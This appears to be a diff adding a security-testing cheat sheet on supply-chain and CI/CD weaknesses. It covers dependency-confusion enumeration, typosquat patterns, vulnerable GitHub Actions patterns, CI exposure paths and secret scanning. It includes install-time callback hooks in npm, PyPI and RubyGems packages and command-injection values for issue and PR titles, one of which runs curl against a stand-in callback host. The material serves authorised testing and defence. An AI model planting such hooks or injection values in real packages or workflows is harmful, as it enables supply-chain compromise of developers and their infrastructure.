@@ -1,0 +1,137 @@
+# Supply Chain and CI/CD Payloads
+# Detection commands, vulnerable patterns and inert callbacks. Use only in authorised scope with your own callback host.
+
+# Dependency confusion: enumerate candidate internal names from manifests
+grep -rhoE '"name":\s*"[^"]+"' package.json
+jq -r '.dependencies,.devDependencies|keys[]' package.json
+cat requirements.txt | cut -d= -f1 | cut -d'>' -f1 | cut -d'<' -f1
+grep -E '^\s*(compile|implementation|api)\s' build.gradle
+grep -oE '<artifactId>[^<]+' pom.xml
+grep -E 'PackageReference Include' *.csproj
+bundle list --name-only
+
+# Dependency confusion: check public registry ownership of each name (404 means unclaimed)
+npm view <package-name> name
+curl -s -o /dev/null -w "%{http_code}\n" https://registry.npmjs.org/<package-name>
+curl -s -o /dev/null -w "%{http_code}\n" https://pypi.org/pypi/<package-name>/json
+curl -s -o /dev/null -w "%{http_code}\n" https://rubygems.org/api/v1/gems/<package-name>.json
+curl -s -o /dev/null -w "%{http_code}\n" https://repo1.maven.org/maven2/<group-path>/<artifact>/
+curl -s -o /dev/null -w "%{http_code}\n" https://api.nuget.org/v3-flatcontainer/<package-name>/index.json
+
+# Dependency confusion: indicators of a vulnerable resolver configuration
+# .npmrc without a scoped registry: registry=https://registry.npmjs.org/
+# pip.conf with --extra-index-url (the highest version wins across indexes)
+# pip install --extra-index-url https://internal.example.test/simple <package>
+# Maven repositories declared without <mirrorOf> restrictions
+# NuGet.config without packageSourceMapping
+
+# Inert proof-of-concept package: callback on install, sends only the package name and a unique token
+# npm package.json (scripts run at install)
+{"name":"<unclaimed-package-name>","version":"99.0.0","scripts":{"preinstall":"node -e \"require('dns').lookup('<unique-token>.oast.example.test',function(){})\""}}
+# PyPI setup.py
+import socket; socket.gethostbyname('<unique-token>.oast.example.test')
+# RubyGems extconf.rb
+require 'resolv'; Resolv.getaddress('<unique-token>.oast.example.test') rescue nil
+
+# Typosquat name generation patterns (check for existing registrations of lookalike names)
+# transposition: lodsah / reqeusts
+# omission: lodas / reuests
+# repetition: lodassh / reqquests
+# hyphen/underscore swap: python-dateutil / python_dateutil
+# scope confusion: @example-test/core vs @exampletest/core
+# prefix/suffix: py-requests / requests-py
+
+# Install-time script locations to review in a dependency
+# package.json: preinstall, install, postinstall, prepare
+# setup.py: cmdclass install override, top-level code
+# pyproject.toml: build-backend custom hooks
+# *.gemspec: extensions
+# pom.xml: exec-maven-plugin / antrun
+# build.rs (Rust), CMake/Makefile hooks
+
+# GitHub Actions: vulnerable patterns (untrusted input interpolated into a run step)
+run: echo "${{ github.event.issue.title }}"
+run: echo "${{ github.event.pull_request.title }}"
+run: echo "${{ github.event.pull_request.body }}"
+run: echo "${{ github.event.pull_request.head.ref }}"
+run: echo "${{ github.head_ref }}"
+run: echo "${{ github.event.comment.body }}"
+run: echo "${{ github.event.review.body }}"
+run: echo "${{ github.event.commits[0].message }}"
+run: echo "${{ github.event.head_commit.message }}"
+run: echo "${{ github.event.head_commit.author.name }}"
+run: echo "${{ github.event.workflow_run.head_branch }}"
+run: echo "${{ github.event.pages[0].page_name }}"
+
+# GitHub Actions: injection proof values (put the value in an issue/PR title on a test fork; the marker prints a harmless line)
+a"; echo ci-injection-marker; "
+$(echo ci-injection-marker)
+`echo ci-injection-marker`
+"; curl -s https://<unique-token>.oast.example.test/ci; "
+x" && echo ci-injection-marker && echo "
+
+# GitHub Actions: dangerous triggers and checkouts to look for
+on: pull_request_target
+on: workflow_run
+on: issue_comment
+uses: actions/checkout@v4 with: { ref: ${{ github.event.pull_request.head.sha }} }
+uses: actions/checkout@v4 with: { ref: ${{ github.event.pull_request.head.ref }} }
+permissions: write-all
+permissions: { contents: write, pull-requests: write, id-token: write }
+secrets: inherit
+
+# GitHub Actions: script-injection via github-script and environment files
+uses: actions/github-script@v7 with: { script: "console.log('${{ github.event.issue.title }}')" }
+run: echo "${{ github.event.issue.title }}" >> $GITHUB_ENV
+run: echo "${{ github.event.issue.title }}" >> $GITHUB_PATH
+run: echo "VAR=${{ github.event.issue.title }}" >> "$GITHUB_OUTPUT"
+
+# GitHub Actions: unpinned third-party actions and mutable references
+uses: someorg/some-action@main
+uses: someorg/some-action@v1
+uses: someorg/some-action@master
+# prefer: uses: someorg/some-action@<40-char-commit-sha>
+
+# GitHub Actions: cache poisoning and artifact trust (look for a privileged workflow that restores a cache or downloads an artifact produced by an untrusted one)
+uses: actions/cache@v4
+uses: actions/download-artifact@v4
+uses: dawidd6/action-download-artifact@v3
+
+# Self-hosted runner exposure checks
+runs-on: self-hosted
+runs-on: [self-hosted, linux]
+# public repository + self-hosted runner + pull_request trigger = untrusted code on infrastructure
+
+# Secrets scanning commands (own repositories)
+gitleaks detect --source . --redact
+trufflehog git file://. --only-verified
+git log -p --all -S 'BEGIN PRIVATE KEY'
+git log --all --full-history -- '*.env' '*.pem' 'id_rsa*'
+docker save <image> | tar -xO | grep -aE 'AKIA[0-9A-Z]{16}'
+
+# Container and base-image supply chain checks
+FROM node:latest
+FROM python
+FROM ubuntu:rolling
+# prefer: FROM node@sha256:<digest>
+
+# CI server exposure checks (own infrastructure)
+/script
+/scriptText
+/manage
+/jenkins/script
+/api/json
+/credentials/
+/asynchPeople/
+/computer/
+/gitlab-ci
+/.github/workflows/
+
+# Registry and lockfile integrity checks
+npm audit signatures
+npm ci --ignore-scripts
+pip install --require-hashes -r requirements.txt
+cargo vet
+# review lockfile diffs for resolved URLs that point outside the expected registry
+grep -E '"resolved":\s*"http' package-lock.json | grep -v registry.npmjs.org
+grep -vE '^\s*#' requirements.txt | grep -E '^git\+|^https?://'
